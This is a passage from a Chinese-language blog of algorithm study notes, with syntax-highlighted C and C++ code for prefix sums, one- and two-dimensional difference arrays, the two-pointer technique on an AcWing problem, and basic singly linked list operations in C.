class="hljs-number">1</span>][col1]+sum[row1][col1];<br>    &#125;<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Your NumMatrix object will be instantiated and called as such:</span><br><span class="hljs-comment"> * NumMatrix* obj = new NumMatrix(matrix);</span><br><span class="hljs-comment"> * int param_1 = obj-&gt;sumRegion(row1,col1,row2,col2);</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h1 id="差分">差分</h1><h2 id="一维差分">一维差分</h2><p><ahref="https://www.acwing.com/solution/content/26588/">详细知识链接</a></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs tap">输入一个长度为 n 的整数序列。<br><br>接下来输入 m 个操作，每个操作包含三个整数 l,r,c，表示将序列中 [l,r] 之间的每个数加上 c。<br><br>请你输出进行完所有操作后的序列。<br><br>输入格式<br>第一行包含两个整数 n 和 m。<br><br>第二行包含 n 个整数，表示整数序列。<br><br>接下来 m 行，每行包含三个整数 l，r，c，表示一个操作。<br><br>输出格式<br>共一行，包含 n 个整数，表示最终序列。<br><br>数据范围<br>1≤n,m≤100000,<br>1≤l≤r≤n,<br>−1000≤c≤1000,<br>−1000≤整数序列中元素的值≤1000<br>输入样例：<br>6 3<br>1<span class="hljs-number"> 2 </span>2<span class="hljs-number"> 1 </span>2 1<br>1<span class="hljs-number"> 3 </span>1<br>3<span class="hljs-number"> 5 </span>1<br>1<span class="hljs-number"> 6 </span>1<br>输出样例：<br>3<span class="hljs-number"> 4 </span>5<span class="hljs-number"> 3 </span>4 2<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> a[N],b[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    <span class="hljs-type">int</span> n,m;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) cin&gt;&gt;a[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) b[i]=a[i]-a[i<span class="hljs-number">-1</span>];<br>    <span class="hljs-keyword">while</span>(m--)<br>    &#123;<br>        <span class="hljs-type">int</span> l,r,c;<br>        cin&gt;&gt;l&gt;&gt;r&gt;&gt;c;<br>        b[l]+=c;<br>        b[r+<span class="hljs-number">1</span>]-=c;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) a[i]=a[i<span class="hljs-number">-1</span>]+b[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) cout&lt;&lt;a[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>y总版</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> a[N],b[N];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> r,<span class="hljs-type">int</span> c)</span></span><br><span class="hljs-function"></span>&#123;<br>    b[l]+=c;<br>    b[r+<span class="hljs-number">1</span>]-=c;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,m;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) cin&gt;&gt;a[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) <span class="hljs-built_in">insert</span>(i,i,a[i]);<span class="hljs-comment">//插入每一个数，并再下一个数后减去该数，在进行b[i]+=b[i-1]时就可以得到b[i]</span><br>    <span class="hljs-keyword">while</span>(m--)<br>    &#123;<br>        <span class="hljs-type">int</span> l,r,c;<br>        cin&gt;&gt;l&gt;&gt;r&gt;&gt;c;<br>        <span class="hljs-built_in">insert</span>(l,r,c);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) b[i]+=b[i<span class="hljs-number">-1</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) cout&lt;&lt;b[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="二维差分">二维差分</h2><p><ahref="https://www.acwing.com/solution/content/27325/">二维差分知识点</a></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs tap">798. 差分矩阵<br>   题目<br>   提交记录<br>   讨论<br>   题解<br>   视频讲解<br><br>输入一个 n 行 m 列的整数矩阵，再输入 q 个操作，每个操作包含五个整数 x1,y1,x2,y2,c，其中 (x1,y1) 和 (x2,y2) 表示一个子矩阵的左上角坐标和右下角坐标。<br><br>每个操作都要将选中的子矩阵中的每个元素的值加上 c。<br><br>请你将进行完所有操作后的矩阵输出。<br><br>输入格式<br>第一行包含整数 n,m,q。<br><br>接下来 n 行，每行包含 m 个整数，表示整数矩阵。<br><br>接下来 q 行，每行包含<span class="hljs-number"> 5 </span>个整数 x1,y1,x2,y2,c，表示一个操作。<br><br>输出格式<br>共 n 行，每行 m 个整数，表示所有操作进行完毕后的最终矩阵。<br><br>数据范围<br>1≤n,m≤1000,<br>1≤q≤100000,<br>1≤x1≤x2≤n,<br>1≤y1≤y2≤m,<br>−1000≤c≤1000,<br>−1000≤矩阵内元素的值≤1000<br>输入样例：<br>3<span class="hljs-number"> 4 </span>3<br>1<span class="hljs-number"> 2 </span>2 1<br>3<span class="hljs-number"> 2 </span>2 1<br>1<span class="hljs-number"> 1 </span>1 1<br>1<span class="hljs-number"> 1 </span>2<span class="hljs-number"> 2 </span>1<br>1<span class="hljs-number"> 3 </span>2<span class="hljs-number"> 3 </span>2<br>3<span class="hljs-number"> 1 </span>3<span class="hljs-number"> 4 </span>1<br>输出样例：<br>2<span class="hljs-number"> 3 </span>4 1<br>4<span class="hljs-number"> 3 </span>4 1<br>2<span class="hljs-number"> 2 </span>2 2<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e3</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> a[N][N],b[N][N],matrix[N][N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,m,q;<br>    cin&gt;&gt;n&gt;&gt;m&gt;&gt;q;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) <br>      <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=m;j++)<br>         cin&gt;&gt;a[i][j];<br>    <span class="hljs-keyword">while</span>(q--)<br>    &#123;<br>        <span class="hljs-type">int</span> x1,y1,x2,y2,c;<br>        cin&gt;&gt;x1&gt;&gt;y1&gt;&gt;x2&gt;&gt;y2&gt;&gt;c;<br>        b[x1][y1]+=c;<span class="hljs-comment">//进行二维差分运算</span><br>        b[x2+<span class="hljs-number">1</span>][y1]-=c;<br>        b[x1][y2+<span class="hljs-number">1</span>]-=c;<br>        b[x2+<span class="hljs-number">1</span>][y2+<span class="hljs-number">1</span>]+=c;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>      <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=m;j++)<br>        matrix[i][j]=matrix[i<span class="hljs-number">-1</span>][j]+matrix[i][j<span class="hljs-number">-1</span>]+b[i][j]-matrix[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>];<span class="hljs-comment">/*算出全部子矩阵加减操作后的前缀和*/</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)&#123;<br>      <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=m;j++)<br>      &#123;<br>            cout&lt;&lt;a[i][j]+matrix[i][j]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<span class="hljs-comment">/*将操作后的前缀和与原数组相加得到答案*/</span><br>      &#125;<br>      cout&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="双指针算法">双指针算法</h1><p>找双指针算法可以先写一个暴力的o(n^2)，然后找i和j是否满足单调性，如果满足就可以使用双指针算法</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-number">799</span>. 最长连续不重复子序列<br>   题目<br>   提交记录<br>   讨论<br>   题解<br>   视频讲解<br><br>给定一个长度为 <span class="hljs-built_in">n</span> 的整数序列，请找出最长的不包含重复的数的连续区间，输出它的长度。<br><br>输入格式<br>第一行包含整数 <span class="hljs-built_in">n</span>。<br><br>第二行包含 <span class="hljs-built_in">n</span> 个整数（均在 <span class="hljs-number">0</span>∼<span class="hljs-number">105</span> 范围内），表示整数序列。<br><br>输出格式<br>共一行，包含一个整数，表示最长的不包含重复的数的连续区间的长度。<br><br>数据范围<br><span class="hljs-number">1</span>≤<span class="hljs-built_in">n</span>≤<span class="hljs-number">105</span><br>输入样例：<br><span class="hljs-number">5</span><br><span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span><br>输出样例：<br><span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> a[N],s[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) cin&gt;&gt;a[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        s[a[i]]++;<span class="hljs-comment">//相当于选中当前当前这个数</span><br>        <span class="hljs-comment">//为啥可以只查找A[i]是否重复，因为前面已经是连续不重复了，重复只能在a[i]</span><br>        <span class="hljs-keyword">while</span>(s[a[i]]&gt;<span class="hljs-number">1</span>)<span class="hljs-comment">//如果有重复，j开始查找，直到查找到没有没有数和a[i]重复为止</span><br>        &#123;<br>            s[a[j]]--;<span class="hljs-comment">//右移相当于当前这个选中状态被取消要减去1；</span><br>            j++;<br>        &#125;<br>        res=<span class="hljs-built_in">max</span>(res,i-j+<span class="hljs-number">1</span>);<br>    &#125;<br>    cout&lt;&lt;res&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="链表的定义">链表的定义</h1><p>链表是物理存储单元上<strong>非连续</strong>的、<strong>非顺序</strong>的存储结构，它是由一个个结点，通过指针来联系起来的，其中每个结点包括数据和指针。</p><figure><imgsrc="https://cdn.jsdelivr.net/gh/OOOOOORAN/PictureBed/img/202201061606450.png"alt="屏幕截图 2022-01-06 160632" /><figcaption aria-hidden="true">屏幕截图 2022-01-06 160632</figcaption></figure><p>链表在内存中采用每个结点都分配在<strong>非连续</strong>的位置，结点与结点之间通过指针连在了一起，查找元素时需要遍历查找。</p><h1 id="链表的表示">链表的表示</h1><h2 id="定义头节点">定义头节点：</h2><p>由于链表的特点（查询或删除元素都要从头结点开始）,所以我们只要在链表中定义头结点即可(我学习采用的是头节点无数据型的链表表示)：</p><figure><imgsrc="https://cdn.jsdelivr.net/gh/OOOOOORAN/PictureBed/img/202201061616514.png"alt="1577669607-4eeed00317fbd8a" /><figcaption aria-hidden="true">1577669607-4eeed00317fbd8a</figcaption></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>&#123;</span><br>    <span class="hljs-type">int</span> data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">next</span>;</span><br>&#125;Node;<span class="hljs-comment">//定义结构体，并创建结构体指针用来链接节点</span><br>Node* <span class="hljs-title function_">createList</span><span class="hljs-params">()</span><br>&#123;<br>   Node* headNode;<br>   headNode=(Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>   headNode-&gt;next=<span class="hljs-literal">NULL</span>;<br>   <span class="hljs-keyword">return</span> headNode;<br>&#125;<span class="hljs-comment">//创建结构体指针需要向内存申请空间，通常来说头节点初始化不指向任何节点</span><br></code></pre></td></tr></table></figure><h2 id="创建节点">创建节点：</h2><p>创建完头节点后我们需要创建新的节点用来存储数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">Node* <span class="hljs-title function_">createNode</span><span class="hljs-params">(<span class="hljs-type">int</span> data)</span><br>&#123;<br>    Node* newNode;<br>    newNode=(Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>    newNode-&gt;data=data;<br>    newNode-&gt;next=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> newNode;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="连接节点">连接节点：</h2><p>链接节点可以采用两种方式：<strong>1. 头插法 2.尾插法</strong></p><h3 id="头插法">头插法：</h3><figure><imgsrc="https://cdn.jsdelivr.net/gh/OOOOOORAN/PictureBed/img/202201061618829.gif"alt="1577669607-2500a8c3aad50ab" /><figcaption aria-hidden="true">1577669607-2500a8c3aad50ab</figcaption></figure><p><strong>具体步骤如上图所示，将将前一个节点指向插入的节点，将插入的节点指向原下一个节点</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">insertList</span><span class="hljs-params">(Node* headNode,<span class="hljs-type">int</span> data)</span><br>&#123;<br>    Node* newNode=createNode(data);<br>    newNode-&gt;next=headNode-&gt;next;<br>    headNode-&gt;next=newNode;<br>&#125;<span class="hljs-comment">//因为头插法需要头节点所以将头节点传入函数</span><br><span class="hljs-comment">//头插法最终输出时数据会逆向输出，因为前面的数据在链接后变到了最尾巴，输出时是顺序输出</span><br></code></pre></td></tr></table></figure><h3 id="尾插法一">尾插法（一）：</h3><p>观察头插法会发现，插入节点时永远会在头节点插入，导致数据是逆序的。那么只要数据都是在链表的最后插入就不会有这个问题。尾插法在头插法的基础上，设置了一个单独的结构体指针保证结构体在插入时永远是在尾巴插入，这样数据存储就是顺序的。</p><p><strong>这种尾插法有一个缺点，就是只能连续插入，不能分开插入，所以我们就有了第二种尾插法</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">Node* <span class="hljs-title function_">LinkList</span><span class="hljs-params">()</span><br>&#123;<br>    Node* pMove;<br>    Node* headNode;<br>    headNode=pMove=(Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>    pMove-&gt;next=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-type">int</span> data;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入您的数据：&quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;data);<br>        <span class="hljs-keyword">if</span>(data==<span class="hljs-number">5</span>) <span class="hljs-keyword">break</span>;<br>        Node* newNode=createNode(data);<br>        pMove-&gt;next=newNode;<br>        pMove=newNode;<br>    &#125;<br>    <span class="hljs-keyword">return</span> headNode;<br>&#125;<span class="hljs-comment">//这里要创建headNode的原因是因为要先让headNode指向下一个节点不未NULL，要不然链表就断掉了。</span><br></code></pre></td></tr></table></figure><h3 id="尾插法二">尾插法（二）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>   Node* headNode=createList();<span class="hljs-comment">//建立头节点</span><br>   Node* tail=headNode;<span class="hljs-comment">//建立一个指针用来插入节点</span><br>   <span class="hljs-comment">//下面为测试节点</span><br>   LinkList(&amp;tail,<span class="hljs-number">1</span>);<span class="hljs-comment">//结构体不包括地址，所以必须取地址符</span><br>   LinkList(&amp;tail,<span class="hljs-number">2</span>);<br>   LinkList(&amp;tail,<span class="hljs-number">3</span>);<br>   printList(headNode);<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>Node* <span class="hljs-title function_">LinkList</span><span class="hljs-params">(Node **ptail,<span class="hljs-type">int</span> data)</span><span class="hljs-comment">//实参引用结构题二级指针，来保证原函数tail能一直指向尾巴</span><br>&#123;<br>    Node* newNode=createNode(data);<br>    (*ptail)-&gt;next=newNode;<span class="hljs-comment">//这里要注意：*号的优先级比-&gt;低，所以必须用括号括起来</span><br>    (*ptail)=newNode;<br>    <span class="hljs-keyword">return</span> (*ptail);<span class="hljs-comment">//返回结构体指针</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="在任意位置插入节点">在任意位置插入节点</h3><p>在任意处插入节点的重要点就在于要先找到要插入位置的地址，因为链表只能知道下一个节点，所以必须要遍历查找，并返回节点的地址，然后插入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c">Node* <span class="hljs-title function_">foundNode</span><span class="hljs-params">(Node* headNode,<span class="hljs-type">int</span> searchdata)</span><br>&#123;<br>    Node* pFound;<br>    <span class="hljs-type">int</span> isFound=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(pFound=headNode-&gt;next;pFound;pFound=pFound-&gt;next)<br>    &#123;<br>      <span class="hljs-keyword">if</span>(pFound-&gt;data==searchdata)&#123;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;找到了\n&quot;</span>);<br>          isFound=<span class="hljs-number">1</span>;<br>          <span class="hljs-keyword">return</span> pFound;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!isFound) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;没找到\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">insertNode</span><span class="hljs-params">(Node** pFound,<span class="hljs-type">int</span> data)</span><br>&#123;<br>   Node* newNode=createNode(data);<br>   newNode-&gt;next=(*pFound)-&gt;next;<br>   (*pFound)-&gt;next=newNode;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    Node* pFound;<br>    Node* headNode=createList();<br>    insertList(headNode,<span class="hljs-number">1</span>);<br>    insertList(headNode,<span class="hljs-number">2</span>);<br>    insertList(headNode,<span class="hljs-number">3</span>);<br>    insertList(headNode,<span class="hljs-number">4</span>);<br>    pFound=foundNode(headNode,<span class="hljs-number">2</span>);<br>    insertNode(&amp;pFound,<span class="hljs-number">6</span>);<br>    printList(headNode);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="打印链表">打印链表</h3><p>链表只能循环打印</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">printList</span><span class="hljs-params">(Node* headNode)</span><br>&#123;<br>   Node* pMove=headNode-&gt;next;<br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;打印链表\n&quot;</span>);<br>   <span class="hljs-keyword">while</span>(pMove)<br>   &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d-&gt;&quot;</span>,pMove-&gt;data);<br>      pMove=pMove-&gt;next;<br>   &#125;<br>   <span class="hljs-built_in">printf</span>(<span 